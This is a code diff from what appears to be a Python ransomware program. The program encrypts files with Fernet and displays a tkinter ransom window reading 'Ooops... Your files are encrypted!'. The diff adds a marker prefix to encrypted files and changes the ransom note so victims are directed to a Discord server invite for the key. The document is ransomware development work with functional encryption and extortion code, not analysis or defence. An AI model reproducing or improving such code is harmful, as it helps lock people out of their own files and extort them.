@@ -29,7 +29,7 @@ class Main:
                             ORIGINAL_FILE.close()
                         ENCRYPTED_CONTENT = Fernet(self.KEY).encrypt(ORIGINAL_CONTENT)
                         with open(FILEPATH, "wb") as ENCRYPTED_FILE:
-                            ENCRYPTED_FILE.write(ENCRYPTED_CONTENT)
+                            ENCRYPTED_FILE.write(b"OHR ! " + ENCRYPTED_CONTENT)
                             ENCRYPTED_FILE.close()
                         self.COUNTER += 1
                     except (Exception,):
@@ -42,7 +42,7 @@ class Main:
                     FILEPATH = os.path.join(FILE1, FILE)
                     try:
                         with open(FILEPATH, "rb") as ENCRYPTED_FILE:
-                            ENCRYPTED_CONTENT = ENCRYPTED_FILE.read()
+                            ENCRYPTED_CONTENT = ENCRYPTED_FILE.read().replace(b"OHR ! ", b"")
                             ENCRYPTED_FILE.close()
                         DECRYPTED_CONTENT = Fernet(self.KEY).decrypt(ENCRYPTED_CONTENT)
                         with open(FILEPATH, "wb") as DECRYPTED_FILE:
@@ -73,7 +73,7 @@ class Main:
         LABEL_1 = tkinter.Label(WINDOW, text="Ooops... Your files are encrypted!", font=("Arial", 14), fg="red", bg="gray10")
         LABEL_1.place(x=160, y=47, anchor="center")
 
-        LABEL_2 = tkinter.Label(WINDOW, text="Unfortunately we don't have a key :)\nContact the developer to get one", font=("Arial", 11), fg="red", bg="gray10")
+        LABEL_2 = tkinter.Label(WINDOW, text="Unfortunately we don't have a key :)\nJoin the discord server to get one", font=("Arial", 11), fg="red", bg="gray10")
         LABEL_2.place(x=160, y=90, anchor="center")
 
         LABEL_3 = tkinter.Label(WINDOW, text="https://discord.gg/y6KcDSWtcy", fg="red", bg="gray10")
